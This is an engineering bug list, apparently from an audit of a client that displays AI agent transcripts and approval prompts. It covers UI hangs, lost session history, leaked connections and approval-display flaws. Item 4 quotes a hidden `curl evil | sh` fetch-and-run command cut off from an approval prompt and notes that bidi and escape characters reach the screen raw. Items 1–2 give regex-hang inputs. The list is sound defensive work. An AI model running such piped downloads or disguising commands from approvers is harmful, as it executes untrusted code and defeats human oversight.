## P0: hangs, data loss, approval safety
1. transcript/inline.dart:8, quadratic-or-worse regexes on agent text, on the UI isolate. `'[a]('*1000` (4 KB, one block) took **27.7 s** in `inlineSpan`, and the tail re-runs it every frame. `'['*4000` took 125 ms. [T] Fix: linear hand scanner with a delimiter stack, plus a work cap that falls back to plain text.
   Status: open

2. markdown.dart:52 `_headingRe` on an unclipped line: `# a` + 30k spaces + `x` took **19.2 s** in `_feed`. `_fenceRe` with 8k spaces took 310 ms. [T] Clip before matching; parse headings and fences by index.
   Status: open

3. host_store.dart:157-177, session switch A→B→A loses history permanently. Late pages of the first follow of A hit the new model, seq jumps, and the real history is then dropped by `e.seq <= seq`. Real host, ~12 k events: every run with ≥25 ms on A (6 of 6) ended `agents 0, unknown 2500–3000`. [T] Fix: fence on the follow answer. Drop a session's events from `open()` until that follow's `Answered` arrives (the host answers first). Better: a follow id on the wire.
   Status: open

4. transcript_parts.dart:134-211 RequestBar breaks SI-15/T11. The subject is cut at 2 lines (`…; curl evil | sh` never shown, no way to expand). Scope is ellipsised ("Full network…"). U+202E and ESC reach the RichText raw. Both allow keys stay enabled. [T, probe-request.png] Fix: escape every non-printing code point, wrap fully (scroll past N lines, allow disabled until seen), put scope on its own wrapping line.
   Status: open

5. markdown.dart:280 `visible()`: the Unicode tag block (U+E0041), U+00AD, U+2028 and U+115F pass through. Conversely ZWJ/ZWNJ are destroyed: 👨‍👩‍👧 becomes `👨�👩�👧`, and Persian می‌خواهم breaks. [T] Keep ZWJ/ZWNJ in prose between joining letters or emoji; escape them in code and approvals; add the missing classes. Session titles, agent, model and tool names are never sanitised. [R]

6. session_model.dart:34 with transcript_view.dart:166: an `item.ended` shorter than its deltas (legal: "authoritative and replaces") throws `RangeError` while building every visible row. Stream 5 paragraphs, end with 2. [T] Equal length with different text is silently ignored (`aaaa` stays after `bbbb`). [T] Fix: compare text (running hash), bump a doc revision, re-derive rows.
   Status: open

7. host_store.dart:95-121, 72-83: an error after `_link =` (e.g. follow → not_found) leaks the link and retries forever as "unreachable: no session s" against a healthy host. 16 connections in 8 s, 16 still open, including after `dispose()`. [T] Close the link on failure, reset backoff only after success, treat not_found as "session gone".
   Status: open

8. link.dart:132-141: `Isolate.kill(immediate)` does not close the socket. The server still saw it open 2 s after `close()`; 13 of 21 stayed open after 20 connect/close cycles plus the first. It also blocks the host's `--idle-exit`. [T] Send a close message, let the worker `destroy()` and exit, kill only on timeout. Add onError/onExit ports.
   Status: open

9. host_store.dart:178-187: `resync 0` re-follows with no backoff. **23 635 follows in 2 s** against a host whose read fails. [T] Same backoff as connect, stop after N.
   Status: open


## P1: engineering
10. host_store.dart:60,192: hidden window means `framesEnabled=false`, so `_pending` grows without bound (20 000 events queued, model seq 0). The client always drains the socket, so the host's outbox bound and resync never act, against "no unbounded buffer". [T] Drain by timer when frames are off; past N, stop reading or drop and re-follow.
   Status: open

11. link.dart:89: no timeout on `hello` or any call. A silent host leaves phase `starting` after 8 s, 1 connection, no retry. [T] 5 s on hello, then unreachable.
